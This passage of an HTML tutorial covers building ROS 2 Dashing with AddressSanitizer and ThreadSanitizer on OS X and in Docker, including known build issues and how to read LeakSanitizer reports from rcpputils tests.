    <span id="cb48-26"><a href="#cb48-26" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">PATH</span><span class="op">=</span><span class="st">&quot;/usr/local/opt/ccache/libexec:</span><span class="va">$PATH</span><span class="st">&quot;</span> <span class="op">&gt;&gt;</span> ~/.bash_profile</span>
    <span id="cb48-27"><a href="#cb48-27" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb48-28"><a href="#cb48-28" aria-hidden="true" tabindex="-1"></a><span class="co"># Fetch ROS 2 Dashing code (at the time of writing, it&#39;s the lastest release)</span></span>
    <span id="cb48-29"><a href="#cb48-29" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> https://raw.githubusercontent.com/ros2/ros2/release-latest/ros2.repos</span>
    <span id="cb48-30"><a href="#cb48-30" aria-hidden="true" tabindex="-1"></a><span class="co"># wget https://raw.githubusercontent.com/ros2/ros2/master/ros2.repos # fetch latest status of the code instead</span></span>
    <span id="cb48-31"><a href="#cb48-31" aria-hidden="true" tabindex="-1"></a><span class="ex">vcs</span> import src <span class="op">&lt;</span> ros2.repos</span>
    <span id="cb48-32"><a href="#cb48-32" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb48-33"><a href="#cb48-33" aria-hidden="true" tabindex="-1"></a><span class="co"># Ignore a bunch of packages that aren&#39;t intentended to be tested</span></span>
    <span id="cb48-34"><a href="#cb48-34" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> src/ros2/common_interfaces/actionlib_msgs/COLCON_IGNORE</span>
    <span id="cb48-35"><a href="#cb48-35" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> src/ros2/common_interfaces/common_interfaces/COLCON_IGNORE</span>
    <span id="cb48-36"><a href="#cb48-36" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> src/ros2/rosidl_typesupport_opensplice/opensplice_cmake_module/COLCON_IGNORE</span>
    <span id="cb48-37"><a href="#cb48-37" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> src/ros2/rmw_fastrtps/rmw_fastrtps_dynamic_cpp/COLCON_IGNORE</span>
    <span id="cb48-38"><a href="#cb48-38" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> src/ros2/rmw_opensplice/rmw_opensplice_cpp/COLCON_IGNORE</span>
    <span id="cb48-39"><a href="#cb48-39" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> src/ros2/ros1_bridge/COLCON_IGNORE</span>
    <span id="cb48-40"><a href="#cb48-40" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> src/ros2/rosidl_typesupport_opensplice/rosidl_typesupport_opensplice_c/COLCON_IGNORE</span>
    <span id="cb48-41"><a href="#cb48-41" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> src/ros2/rosidl_typesupport_opensplice/rosidl_typesupport_opensplice_cpp/COLCON_IGNORE</span>
    <span id="cb48-42"><a href="#cb48-42" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> src/ros2/common_interfaces/shape_msgs/COLCON_IGNORE</span>
    <span id="cb48-43"><a href="#cb48-43" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> src/ros2/common_interfaces/stereo_msgs/COLCON_IGNORE</span>
    <span id="cb48-44"><a href="#cb48-44" aria-hidden="true" tabindex="-1"></a><span class="fu">touch</span> src/ros2/common_interfaces/trajectory_msgs/COLCON_IGNORE</span></code></pre></div>
    <h4 id="compile-the-code-with-sanitizers-enabled-os-x">Compile the code with sanitizers enabled (OS X)</h4>
    <h5 id="addresssanitizer-asan">AddressSanitizer (ASan)</h5>
    <p>For ASan[6] we compile the ROS 2 Dashing code as follows:</p>
    <div class="sourceCode" id="cb49"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb49-1"><a href="#cb49-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Get last version of FastRTPS</span></span>
    <span id="cb49-2"><a href="#cb49-2" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> src/eProsima/Fast-RTPS/</span>
    <span id="cb49-3"><a href="#cb49-3" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout master</span>
    <span id="cb49-4"><a href="#cb49-4" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> pull</span>
    <span id="cb49-5"><a href="#cb49-5" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb49-6"><a href="#cb49-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Install openssl</span></span>
    <span id="cb49-7"><a href="#cb49-7" aria-hidden="true" tabindex="-1"></a><span class="ex">brew</span> install openssl</span>
    <span id="cb49-8"><a href="#cb49-8" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb49-9"><a href="#cb49-9" aria-hidden="true" tabindex="-1"></a><span class="co"># Env variables to compile from source in OS X</span></span>
    <span id="cb49-10"><a href="#cb49-10" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">CMAKE_PREFIX_PATH</span><span class="op">=</span><span class="va">$CMAKE_PREFIX_PATH</span>:/usr/local/opt/qt</span>
    <span id="cb49-11"><a href="#cb49-11" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">PATH</span><span class="op">=</span><span class="va">$PATH</span>:/usr/local/opt/qt/bin</span>
    <span id="cb49-12"><a href="#cb49-12" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">OPENSSL_ROOT_DIR</span><span class="op">=</span><span class="kw">`</span><span class="ex">brew</span> <span class="at">--prefix</span> openssl<span class="kw">`</span></span>
    <span id="cb49-13"><a href="#cb49-13" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb49-14"><a href="#cb49-14" aria-hidden="true" tabindex="-1"></a><span class="co"># Compile code </span></span>
    <span id="cb49-15"><a href="#cb49-15" aria-hidden="true" tabindex="-1"></a><span class="ex">colcon</span> build <span class="at">--build-base</span><span class="op">=</span>build-asan <span class="at">--install-base</span><span class="op">=</span>install-asan <span class="dt">\</span></span>
    <span id="cb49-16"><a href="#cb49-16" aria-hidden="true" tabindex="-1"></a>    <span class="at">--cmake-args</span> <span class="at">-DOSRF_TESTING_TOOLS_CPP_DISABLE_MEMORY_TOOLS</span><span class="op">=</span>ON <span class="dt">\</span></span>
    <span id="cb49-17"><a href="#cb49-17" aria-hidden="true" tabindex="-1"></a>                 <span class="at">-DINSTALL_EXAMPLES</span><span class="op">=</span>OFF <span class="at">-DSECURITY</span><span class="op">=</span>ON <span class="at">--no-warn-unused-cli</span> <span class="dt">\</span></span>
    <span id="cb49-18"><a href="#cb49-18" aria-hidden="true" tabindex="-1"></a>                 <span class="at">-DCMAKE_BUILD_TYPE</span><span class="op">=</span>Debug <span class="dt">\</span></span>
    <span id="cb49-19"><a href="#cb49-19" aria-hidden="true" tabindex="-1"></a>    <span class="at">--mixin</span> asan-gcc <span class="dt">\</span></span>
    <span id="cb49-20"><a href="#cb49-20" aria-hidden="true" tabindex="-1"></a>    <span class="at">--packages-up-to</span> test_communication <span class="dt">\</span></span>
    <span id="cb49-21"><a href="#cb49-21" aria-hidden="true" tabindex="-1"></a>    <span class="at">--symlink-install</span></span></code></pre></div>
    <p>and then launch the tests:</p>
    <div class="sourceCode" id="cb50"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb50-1"><a href="#cb50-1" aria-hidden="true" tabindex="-1"></a><span class="ex">colcon</span> test <span class="at">--build-base</span><span class="op">=</span>build-asan <span class="at">--install-base</span><span class="op">=</span>install-asan <span class="dt">\</span></span>
    <span id="cb50-2"><a href="#cb50-2" aria-hidden="true" tabindex="-1"></a>    <span class="at">--event-handlers</span> sanitizer_report+ <span class="at">--packages-up-to</span> test_communication</span></code></pre></div>
    <h5 id="threadsanitizer-tsan">ThreadSanitizer (TSan)</h5>
    <p>For TSan[7] TODO</p>
    <div class="sourceCode" id="cb51"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb51-1"><a href="#cb51-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Build the code with tsan</span></span>
    <span id="cb51-2"><a href="#cb51-2" aria-hidden="true" tabindex="-1"></a><span class="ex">colcon</span> build <span class="at">--build-base</span><span class="op">=</span>build-tsan <span class="at">--install-base</span><span class="op">=</span>install-tsan <span class="dt">\</span></span>
    <span id="cb51-3"><a href="#cb51-3" aria-hidden="true" tabindex="-1"></a>    <span class="at">--cmake-args</span> <span class="at">-DOSRF_TESTING_TOOLS_CPP_DISABLE_MEMORY_TOOLS</span><span class="op">=</span>ON <span class="dt">\</span></span>
    <span id="cb51-4"><a href="#cb51-4" aria-hidden="true" tabindex="-1"></a>                 <span class="at">-DINSTALL_EXAMPLES</span><span class="op">=</span>OFF <span class="at">-DSECURITY</span><span class="op">=</span>ON <span class="at">--no-warn-unused-cli</span> <span class="dt">\</span></span>
    <span id="cb51-5"><a href="#cb51-5" aria-hidden="true" tabindex="-1"></a>                 <span class="at">-DCMAKE_BUILD_TYPE</span><span class="op">=</span>Debug <span class="dt">\</span></span>
    <span id="cb51-6"><a href="#cb51-6" aria-hidden="true" tabindex="-1"></a>    <span class="at">--mixin</span> tsan <span class="dt">\</span></span>
    <span id="cb51-7"><a href="#cb51-7" aria-hidden="true" tabindex="-1"></a>    <span class="at">--packages-up-to</span> test_communication <span class="dt">\</span></span>
    <span id="cb51-8"><a href="#cb51-8" aria-hidden="true" tabindex="-1"></a>    <span class="at">--symlink-install</span></span>
    <span id="cb51-9"><a href="#cb51-9" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb51-10"><a href="#cb51-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Run the tests</span></span>
    <span id="cb51-11"><a href="#cb51-11" aria-hidden="true" tabindex="-1"></a><span class="ex">colcon</span> test <span class="at">--build-base</span><span class="op">=</span>build-tsan <span class="at">--install-base</span><span class="op">=</span>install-tsan <span class="dt">\</span></span>
    <span id="cb51-12"><a href="#cb51-12" aria-hidden="true" tabindex="-1"></a>    <span class="at">--event-handlers</span> sanitizer_report+ <span class="at">--packages-up-to</span> test_communication</span></code></pre></div>
    <h4 id="known-issues">Known Issues</h4>
    <h5 id="linking-issues-in-fastrtps-when-enabling-security">Linking issues in FastRTPS when enabling security</h5>
    <p>The following happens with the version included in the Dashing Release:</p>
    <div class="sourceCode" id="cb52"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb52-1"><a href="#cb52-1" aria-hidden="true" tabindex="-1"></a><span class="ex">---</span> stderr: fastrtps</span>
    <span id="cb52-2"><a href="#cb52-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Undefined</span> symbols for architecture x86_64:</span>
    <span id="cb52-3"><a href="#cb52-3" aria-hidden="true" tabindex="-1"></a>  <span class="st">&quot;_DH_get_2048_256&quot;</span><span class="ex">,</span> referenced from:</span>
    <span id="cb52-4"><a href="#cb52-4" aria-hidden="true" tabindex="-1"></a>      <span class="ex">generate_dh_key</span><span class="er">(</span><span class="ex">int,</span> eprosima::fastrtps::rtps::security::SecurityException<span class="kw">&amp;)</span> <span class="er">in</span> <span class="ex">PKIDH.cpp.o</span></span>
    <span id="cb52-5"><a href="#cb52-5" aria-hidden="true" tabindex="-1"></a>      <span class="ex">generate_dh_peer_key</span><span class="er">(</span><span class="ex">std::__1::vector</span><span class="op">&lt;</span>unsigned char, std::__1::allocator<span class="op">&lt;</span>unsigned char<span class="op">&gt;</span> <span class="op">&gt;</span> const<span class="kw">&amp;</span><span class="ex">,</span> eprosima::fastrtps::rtps::security::SecurityException<span class="kw">&amp;</span><span class="ex">,</span> int<span class="kw">)</span> <span class="er">in</span> <span class="ex">PKIDH.cpp.o</span></span>
    <span id="cb52-6"><a href="#cb52-6" aria-hidden="true" tabindex="-1"></a>  <span class="st">&quot;_X509_get0_signature&quot;</span><span class="ex">,</span> referenced from:</span>
    <span id="cb52-7"><a href="#cb52-7" aria-hidden="true" tabindex="-1"></a>      <span class="ex">get_signature_algorithm</span><span class="er">(</span><span class="ex">x509_st*,</span> std::__1::basic_string<span class="op">&lt;</span>char, std::__1::char_traits<span class="op">&lt;</span>char<span class="op">&gt;</span>, std::__1::allocator<span class="op">&lt;</span>char<span class="op">&gt;</span> <span class="op">&gt;&amp;</span>, eprosima::fastrtps::rtps::security::SecurityException<span class="kw">&amp;)</span> <span class="er">in</span> <span class="ex">PKIDH.cpp.o</span></span>
    <span id="cb52-8"><a href="#cb52-8" aria-hidden="true" tabindex="-1"></a>      <span class="ex">get_signature_algorithm</span><span class="er">(</span><span class="ex">x509_st*,</span> std::__1::basic_string<span class="op">&lt;</span>char, std::__1::char_traits<span class="op">&lt;</span>char<span class="op">&gt;</span>, std::__1::allocator<span class="op">&lt;</span>char<span class="op">&gt;</span> <span class="op">&gt;&amp;</span>, eprosima::fastrtps::rtps::security::SecurityException<span class="kw">&amp;)</span> <span class="er">in</span> <span class="ex">Permissions.cpp.o</span></span>
    <span id="cb52-9"><a href="#cb52-9" aria-hidden="true" tabindex="-1"></a><span class="ex">ld:</span> symbol<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">not</span> found for architecture x86_64</span>
    <span id="cb52-10"><a href="#cb52-10" aria-hidden="true" tabindex="-1"></a><span class="ex">clang:</span> error: linker command failed with exit code 1 <span class="er">(</span><span class="ex">use</span> <span class="at">-v</span> to see invocation<span class="kw">)</span></span>
    <span id="cb52-11"><a href="#cb52-11" aria-hidden="true" tabindex="-1"></a><span class="va">make</span><span class="op">[</span><span class="dv">2</span><span class="op">]</span><span class="ex">:</span> <span class="pp">***</span> [src/cpp/libfastrtps.1.8.0.dylib] Error 1</span>
    <span id="cb52-12"><a href="#cb52-12" aria-hidden="true" tabindex="-1"></a><span class="va">make</span><span class="op">[</span><span class="dv">1</span><span class="op">]</span><span class="ex">:</span> <span class="pp">***</span> [src/cpp/CMakeFiles/fastrtps.dir/all] Error 2</span>
    <span id="cb52-13"><a href="#cb52-13" aria-hidden="true" tabindex="-1"></a><span class="ex">make:</span> <span class="pp">***</span> [all] Error 2</span>
    <span id="cb52-14"><a href="#cb52-14" aria-hidden="true" tabindex="-1"></a><span class="ex">---</span></span>
    <span id="cb52-15"><a href="#cb52-15" aria-hidden="true" tabindex="-1"></a><span class="ex">Failed</span>   <span class="op">&lt;&lt;&lt;</span> fastrtps   [ Exited with code 2 ]</span></code></pre></div>
    <p>Solution: install latest version of Fast-RTPS</p>
    <h5 id="results-of-the-test-indicate-interceptors-are-not-working.-this-may-be-because-addresssanitizer-is-loaded-too-late-...-interceptors-not-installed">Results of the test indicate <code>Interceptors are not working. This may be because AddressSanitizer is loaded too late ... interceptors not installed</code></h5>
    <div class="sourceCode" id="cb53"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb53-1"><a href="#cb53-1" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
    <span id="cb53-2"><a href="#cb53-2" aria-hidden="true" tabindex="-1"></a><span class="ex">--</span></span>
    <span id="cb53-3"><a href="#cb53-3" aria-hidden="true" tabindex="-1"></a><span class="ex">log/latest_test/test_communication/stdout.log:21:</span> [test_subscriber-12] ==3301==ERROR: Interceptors are not working. This may be because AddressSanitizer is loaded too late <span class="er">(</span><span class="ex">e.g.</span> via dlopen<span class="kw">)</span><span class="bu">.</span> Please launch the executable with:</span>
    <span id="cb53-4"><a href="#cb53-4" aria-hidden="true" tabindex="-1"></a><span class="ex">log/latest_test/test_communication/stdout.log-21:</span> [test_subscriber-12] DYLD_INSERT_LIBRARIES=/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/10.0.1/lib/darwin/libclang_rt.asan_osx_dynamic.dylib</span>
    <span id="cb53-5"><a href="#cb53-5" aria-hidden="true" tabindex="-1"></a><span class="ex">log/latest_test/test_communication/stdout.log-21:</span> [test_subscriber-12] <span class="st">&quot;interceptors not installed&quot;</span> <span class="kw">&amp;&amp;</span> <span class="ex">0</span></span>
    <span id="cb53-6"><a href="#cb53-6" aria-hidden="true" tabindex="-1"></a><span class="ex">log/latest_test/test_communication/stdout.log-21:</span> [ERROR] [test_subscriber-12]: process has died [pid 3301, exit code <span class="at">-6,</span> cmd <span class="st">&#39;/usr/local/opt/python/bin/python3.7 /Users/victor/ros2_asan_ws/src/ros2/system_tests/test_communication/test/subscriber_py.py Defaults /test_time_15_20_17&#39;</span>].</span>
    <span id="cb53-7"><a href="#cb53-7" aria-hidden="true" tabindex="-1"></a><span class="ex">--</span></span>
    <span id="cb53-8"><a href="#cb53-8" aria-hidden="true" tabindex="-1"></a><span class="ex">log/latest_test/test_communication/stdout.log:21:</span> [test_subscriber-14] ==3303==ERROR: Interceptors are not working. This may be because AddressSanitizer is loaded too late <span class="er">(</span><span class="ex">e.g.</span> via dlopen<span class="kw">)</span><span class="bu">.</span> Please launch the executable with:</span>
    <span id="cb53-9"><a href="#cb53-9" aria-hidden="true" tabindex="-1"></a><span class="ex">log/latest_test/test_communication/stdout.log-21:</span> [test_subscriber-14] DYLD_INSERT_LIBRARIES=/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/10.0.1/lib/darwin/libclang_rt.asan_osx_dynamic.dylib</span>
    <span id="cb53-10"><a href="#cb53-10" aria-hidden="true" tabindex="-1"></a><span class="ex">log/latest_test/test_communication/stdout.log-21:</span> [test_subscriber-14] <span class="st">&quot;interceptors not installed&quot;</span> <span class="kw">&amp;&amp;</span> <span class="ex">0</span></span>
    <span id="cb53-11"><a href="#cb53-11" aria-hidden="true" tabindex="-1"></a><span class="ex">log/latest_test/test_communication/stdout.log-21:</span> [ERROR] [test_subscriber-14]: process has died [pid 3303, exit code <span class="at">-6,</span> cmd <span class="st">&#39;/usr/local/opt/python/bin/python3.7 /Users/victor/ros2_asan_ws/src/ros2/system_tests/test_communication/test/subscriber_py.py Empty /test_time_15_20_17&#39;</span>].</span>
    <span id="cb53-12"><a href="#cb53-12" aria-hidden="true" tabindex="-1"></a><span class="ex">--</span></span>
    <span id="cb53-13"><a href="#cb53-13" aria-hidden="true" tabindex="-1"></a><span class="ex">log/latest_test/test_communication/stdout.log:21:</span> [test_subscriber-16] ==3305==ERROR: Interceptors are not working. This may be because AddressSanitizer is loaded too late <span class="er">(</span><span class="ex">e.g.</span> via dlopen<span class="kw">)</span><span class="bu">.</span> Please launch the executable with:</span>
    <span id="cb53-14"><a href="#cb53-14" aria-hidden="true" tabindex="-1"></a><span class="ex">log/latest_test/test_communication/stdout.log-21:</span> [test_subscriber-16] DYLD_INSERT_LIBRARIES=/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/10.0.1/lib/darwin/libclang_rt.asan_osx_dynamic.dylib</span>
    <span id="cb53-15"><a href="#cb53-15" aria-hidden="true" tabindex="-1"></a><span class="ex">log/latest_test/test_communication/stdout.log-21:</span> [test_subscriber-16] <span class="st">&quot;interceptors not installed&quot;</span> <span class="kw">&amp;&amp;</span> <span class="ex">0</span></span>
    <span id="cb53-16"><a href="#cb53-16" aria-hidden="true" tabindex="-1"></a><span class="ex">log/latest_test/test_communication/stdout.log-21:</span> [ERROR] [test_subscriber-16]: process has died [pid 3305, exit code <span class="at">-6,</span> cmd <span class="st">&#39;/usr/local/opt/python/bin/python3.7 /Users/victor/ros2_asan_ws/src/ros2/system_tests/test_communication/test/subscriber_py.py MultiNested /test_time_15_20_18&#39;</span>].</span>
    <span id="cb53-17"><a href="#cb53-17" aria-hidden="true" tabindex="-1"></a><span class="ex">--</span></span></code></pre></div>
    <p>Complete dump at https://gist.github.com/vmayoral/ffcba20d29fc3546ceffeb112d473dd1. It indicates that it should be run with</p>
    <div class="sourceCode" id="cb54"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb54-1"><a href="#cb54-1" aria-hidden="true" tabindex="-1"></a><span class="va">DYLD_INSERT_LIBRARIES</span><span class="op">=</span>/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/10.0.1/lib/darwin/libclang_rt.asan_osx_dynamic.dylib</span></code></pre></div>
    </details>
    <h3 id="docker">Docker</h3>
    <div class="sourceCode" id="cb55"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb55-1"><a href="#cb55-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build <span class="at">-t</span> basic_cybersecurity_vulnerabilities1:latest .</span>
    <span id="cb55-2"><a href="#cb55-2" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">--privileged</span> <span class="at">-it</span> <span class="at">-v</span> /tmp/log:/opt/ros2_asan_ws/log basic_cybersecurity_vulnerabilities1:latest /bin/bash</span></code></pre></div>
    <p>and now run the tests:</p>
    <div class="sourceCode" id="cb56"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb56-1"><a href="#cb56-1" aria-hidden="true" tabindex="-1"></a><span class="ex">colcon</span> test <span class="at">--build-base</span><span class="op">=</span>build-asan <span class="at">--install-base</span><span class="op">=</span>install-asan <span class="dt">\</span></span>
    <span id="cb56-2"><a href="#cb56-2" aria-hidden="true" tabindex="-1"></a>  <span class="at">--event-handlers</span> sanitizer_report+ <span class="at">--packages-up-to</span> test_communication</span></code></pre></div>
    <p>results are under <code>/tmp/log</code>.</p>
    <h3 id="analyzing-results">Analyzing results</h3>
    <h4 id="analyzing-example">Analyzing example</h4>
    <p>I’ll try and analyze here the example provided at https://github.com/colcon/colcon-sanitizer-reports/blob/master/README.rst before jumping into a new one to gain additional understanding:</p>
    <p>It appears that ASan detected memory leaks in the <code>rcpputils</code> module:</p>
    <div class="sourceCode" id="cb57"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb57-1"><a href="#cb57-1" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> <span class="at">-R</span> <span class="st">&#39;==.*==ERROR: .*Sanitizer&#39;</span> <span class="at">-A</span> 3</span>
    <span id="cb57-2"><a href="#cb57-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[..]</span></span>
    <span id="cb57-3"><a href="#cb57-3" aria-hidden="true" tabindex="-1"></a><span class="ex">--</span></span>
    <span id="cb57-4"><a href="#cb57-4" aria-hidden="true" tabindex="-1"></a><span class="ex">rcpputils/stdout_stderr.log:1:</span> ==32481==ERROR: LeakSanitizer: detected memory leaks</span>
    <span id="cb57-5"><a href="#cb57-5" aria-hidden="true" tabindex="-1"></a><span class="ex">rcpputils/stdout_stderr.log-1:</span></span>
    <span id="cb57-6"><a href="#cb57-6" aria-hidden="true" tabindex="-1"></a><span class="ex">rcpputils/stdout_stderr.log-1:</span> Direct leak of 4 byte<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="er">in</span> <span class="ex">1</span> object<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">allocated</span> from:</span>
    <span id="cb57-7"><a href="#cb57-7" aria-hidden="true" tabindex="-1"></a><span class="ex">rcpputils/stdout_stderr.log-1:</span>     <span class="co">#0 0x7f7d99dac458 in operator new(unsigned long) (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xe0458)</span></span></code></pre></div>
    <p>Particularly, it appears that the leaks are as follows:</p>
    <div class="sourceCode" id="cb58"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb58-1"><a href="#cb58-1" aria-hidden="true" tabindex="-1"></a><span class="ex">Direct</span> leak of 4 byte<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="er">in</span> <span class="ex">1</span> object<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">allocated</span> from:</span>
    <span id="cb58-2"><a href="#cb58-2" aria-hidden="true" tabindex="-1"></a>    <span class="co">#0 0x7fbefcd0b458 in operator new(unsigned long) (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xe0458)</span></span>
    <span id="cb58-3"><a href="#cb58-3" aria-hidden="true" tabindex="-1"></a>    <span class="co">#1 0x5620b4c650a9 in FakeGuarded::FakeGuarded() (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x190a9)</span></span>
    <span id="cb58-4"><a href="#cb58-4" aria-hidden="true" tabindex="-1"></a>    <span class="co">#2 0x5620b4c63444 in **test_tsa_shared_capability_Test**::TestBody() (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x17444)</span></span>
    <span id="cb58-5"><a href="#cb58-5" aria-hidden="true" tabindex="-1"></a>    <span class="co">#3 0x5620b4cdc4fd in void testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x904fd)</span></span>
    <span id="cb58-6"><a href="#cb58-6" aria-hidden="true" tabindex="-1"></a>    <span class="co">#4 0x5620b4cce1e7 in void testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x821e7)</span></span>
    <span id="cb58-7"><a href="#cb58-7" aria-hidden="true" tabindex="-1"></a>    <span class="co">#5 0x5620b4c79f0f in testing::Test::Run() (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x2df0f)</span></span>
    <span id="cb58-8"><a href="#cb58-8" aria-hidden="true" tabindex="-1"></a>    <span class="co">#6 0x5620b4c7b33a in testing::TestInfo::Run() (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x2f33a)</span></span>
    <span id="cb58-9"><a href="#cb58-9" aria-hidden="true" tabindex="-1"></a>    <span class="co">#7 0x5620b4c7bede in testing::TestCase::Run() (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x2fede)</span></span>
    <span id="cb58-10"><a href="#cb58-10" aria-hidden="true" tabindex="-1"></a>    <span class="co">#8 0x5620b4c96fef in testing::internal::UnitTestImpl::RunAllTests() (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x4afef)</span></span>
    <span id="cb58-11"><a href="#cb58-11" aria-hidden="true" tabindex="-1"></a>    <span class="co">#9 0x5620b4cdefb0 in bool testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x92fb0)</span></span>
    <span id="cb58-12"><a href="#cb58-12" aria-hidden="true" tabindex="-1"></a>    <span class="co">#10 0x5620b4cd04b0 in bool testing::internal::HandleExceptionsInMethodIfSupported&lt;testing::internal::UnitTestImpl, bool&gt;(testing::internal::UnitTestImpl*, bool (testing::internal::UnitTestImpl::*)(), char const*) (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x844b0)</span></span>
    <span id="cb58-13"><a href="#cb58-13" aria-hidden="true" tabindex="-1"></a>    <span class="co">#11 0x5620b4c93d83 in testing::UnitTest::Run() (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x47d83)</span></span>
    <span id="cb58-14"><a href="#cb58-14" aria-hidden="true" tabindex="-1"></a>    <span class="co">#12 0x5620b4c672d2 in RUN_ALL_TESTS() (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x1b2d2)</span></span>
    <span id="cb58-15"><a href="#cb58-15" aria-hidden="true" tabindex="-1"></a>    <span class="co">#13 0x5620b4c67218 in main (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x1b218)</span></span>
    <span id="cb58-16"><a href="#cb58-16" aria-hidden="true" tabindex="-1"></a>    <span class="co">#14 0x7fbefc09bb96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)</span></span>
    <span id="cb58-17"><a href="#cb58-17" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb58-18"><a href="#cb58-18" aria-hidden="true" tabindex="-1"></a><span class="ex">Direct</span> leak of 4 byte<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="er">in</span> <span class="ex">1</span> object<span class="er">(</span><span class="ex">s</span><span class="kw">)</span> <span class="ex">allocated</span> from:</span>
    <span id="cb58-19"><a href="#cb58-19" aria-hidden="true" tabindex="-1"></a>    <span class="co">#0 0x7fbefcd0b458 in operator new(unsigned long) (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xe0458)</span></span>
    <span id="cb58-20"><a href="#cb58-20" aria-hidden="true" tabindex="-1"></a>    <span class="co">#1 0x5620b4c650a9 in FakeGuarded::FakeGuarded() (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x190a9)</span></span>
    <span id="cb58-21"><a href="#cb58-21" aria-hidden="true" tabindex="-1"></a>    <span class="co">#2 0x5620b4c62d4b in **test_tsa_capability_Test**::TestBody() (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x16d4b)</span></span>
    <span id="cb58-22"><a href="#cb58-22" aria-hidden="true" tabindex="-1"></a>    <span class="co">#3 0x5620b4cdc4fd in void testing::internal::HandleSehExceptionsInMethodIfSupported&lt;testing::Test, void&gt;(testing::Test*, void (testing::Test::*)(), char const*) (/home/ANT.AMAZON.COM/tmoulard/ros2_ws/build-asan/rcpputils/test_basic+0x904fd)</span></span>
